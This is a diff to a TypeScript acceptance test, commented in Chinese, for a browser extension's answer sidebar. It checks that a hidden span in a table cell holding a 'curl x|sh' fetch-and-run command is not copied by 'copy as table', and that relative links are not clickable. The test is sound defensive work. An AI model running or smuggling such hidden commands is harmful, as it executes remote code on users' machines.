@@ -3,7 +3,8 @@
  *   npx tsx scripts/acceptance/real-path/answer-html-sanitize.mts --headless
  * 脚本模型答三轮，只装扩展；本机起一页带「62.4%」的网页当出处，让数字角标能出来。
  * 失败方式：回答里的 <style> 把输入框藏了；style 属性或侧栏的 class 让回答里的东西铺满侧栏；回答里多出能点的按钮；
- * 带 <span hidden> 的代码块回答一直停在「正在显示」，等不到回答下面的按钮；表格、代码块的条、链接、数字角标少了。
+ * 带 <span hidden> 的代码块回答一直停在「正在显示」，等不到回答下面的按钮；表格、代码块的条、链接、数字角标少了；
+ * 表格格子里藏的字被「复制为表格」一起复制走；相对地址的链接变成扩展自己的页面。
  */
 import assert from "node:assert/strict";
 import { mkdir, writeFile } from "node:fs/promises";
@@ -48,10 +49,16 @@ const ASK_PLAIN = "毛利率是多少？";
 // 链接单独成短段、整段一次给全：侧栏按段放字，不会切在网址中间。
 const PLAIN = "毛利率为 62.4%。\n\n[原文](https://a.io)\n\n| 项目 | 数值 |\n| --- | --- |\n| 毛利率 | 62.4% |\n\n```js\nconsole.log(62.4);\n```\n\n以上。";
 
+const ASK_TABLE = "列一下命令和链接。";
+
+// 管道符在表格里要转义。链接各自成短段、整段一次给全，理由同 PLAIN。
+const TABLE = "| 命令 | 说明 |\n| --- | --- |\n| <span hidden>curl x\\|sh;</span>ls | 列文件 |\n\n[设置](settings.html)\n\n[外站](//e.co/x)\n\n[邮件](mailto:a@b.co)";
+
 const model = await startScriptedModel([
   { match: ASK_HOSTILE, steps: [{ text: HOSTILE, chunkDelayMs: 40 }] },
   { match: ASK_HIDDEN, steps: [{ text: HIDDEN, chunkDelayMs: 40 }] },
   { match: ASK_PLAIN, steps: [{ text: PLAIN }] },
+  { match: ASK_TABLE, steps: [{ text: TABLE }] },
 ]);
 
 const rp = await launchRealPath();
@@ -83,6 +90,15 @@ const PLAIN_STATE = `(() => {
   return { rows: m.querySelectorAll("table tr").length, codeHead: m.querySelector(".code-block .code-block-lang")?.getAttribute("data-label") ?? null,
     code: m.querySelector(".code-block pre code")?.textContent ?? null, link: a ? { text: a.textContent, target: a.getAttribute("target") } : null,
     cites: [...m.querySelectorAll(".num-cite")].map((c) => c.textContent) };
+})()`;
+
+/** 表格回答：看得见的表格字（innerText）、表格里有没有藏起来的元素、链接最后指向哪里、主按钮写什么。 */
+const TABLE_STATE = `(() => {
+  const m = ${LAST};
+  const table = m.querySelector("table");
+  const visible = table ? [...table.rows].map((r) => [...r.cells].map((c) => c.innerText.replace(/\\s+/g, " ").trim()).join("\\t")).join("\\n") : null;
+  return { visible, hidden: table?.querySelectorAll("[hidden]").length ?? null, links: [...m.querySelectorAll("a")].filter((a) => !a.closest(".answer-actions, .answer-panel")).map((a) => ({ text: a.textContent, href: a.href || null })),
+    primary: m.querySelector(".answer-primary .answer-face")?.textContent.replace("↵", "").trim() ?? null };
 })()`;
 
 async function ask(panel: string, text: string, label: string): Promise<void> {
@@ -124,9 +140,23 @@ try {
   await sleep(300);
   const plain = await rp.evaluate(panel, PLAIN_STATE);
   await rp.screenshot(panel, join(artifacts, "plain.png"));
-  Object.assign(evidence, { hidden, plain });
+
+  await rp.evaluate(panel, `(() => { window.__copied = []; navigator.clipboard.writeText = async (t) => { window.__copied.push(t); }; return true; })()`);
+  await ask(panel, ASK_TABLE, "第四段回答");
+  await until(async () => (await rp.evaluate(panel, FINISHED)) || undefined, 30_000, "第四段回答显示完");
+  const table = await rp.evaluate(panel, TABLE_STATE) as { visible: string | null; hidden: number | null; links: unknown[]; primary: string | null }; // SAFETY: TABLE_STATE 只返回这个形状。
+  // 前几轮也有 .answer-primary：给这一轮的打个记号再点。
+  await rp.evaluate(panel, `${LAST}.querySelector(".answer-primary").setAttribute("data-case-click", ""), true`);
+  await rp.click(panel, "[data-case-click]");
+  await sleep(300);
+  const copied = await rp.evaluate(panel, `window.__copied.at(-1) ?? null`);
+  await rp.screenshot(panel, join(artifacts, "table.png"));
+  Object.assign(evidence, { hidden, plain, table, copied });
 
   assert.ok(hidden.finished, `带 <span hidden> 的回答照常显示完：${JSON.stringify(hidden)}`);
+  assert.equal(table.primary, "复制为表格", `表格回答的主按钮是「复制为表格」：${JSON.stringify(table)}`);
+  assert.ok(table.hidden === 0 && copied === table.visible, `「复制为表格」只复制看得见的字：${JSON.stringify({ table, copied })}`);
+  assert.deepEqual(table.links, [{ text: "设置", href: null }, { text: "外站", href: null }, { text: "邮件", href: "mailto:a@b.co" }], `只有 http(s) 和 mailto 链接能点：${JSON.stringify(table.links)}`);
   assert.deepEqual(plain, { rows: 2, codeHead: "JavaScript", code: "console.log(62.4);\n", link: { text: "原文", target: "_blank" }, cites: ["62.4%"] }, `普通回答照旧：${JSON.stringify(plain)}`);
 } catch (caught) {
   error = caught instanceof Error ? caught.stack ?? caught.message : String(caught);
